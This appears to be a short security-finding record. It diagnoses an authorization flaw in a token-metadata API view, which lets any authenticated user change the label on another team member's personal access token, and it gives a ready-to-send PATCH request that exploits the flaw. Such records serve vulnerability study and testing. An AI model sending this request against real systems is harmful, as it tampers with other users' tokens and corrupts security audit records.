diagnosis: The view updates the descriptive label of CustomPersonalToken by primary key without checking if token.user matches request.user. An authenticated user can tamper with labels and audit descriptions of personal access tokens belonging to other team members.
exploit_request:
PATCH /api/auth/tokens/812/metadata/ HTTP/1.1
Host: gitlab.corp-internal.com
Authorization: Token <valid_user_token>
Content-Type: application/json

{"label": "Compromised - Revoked by Security"}
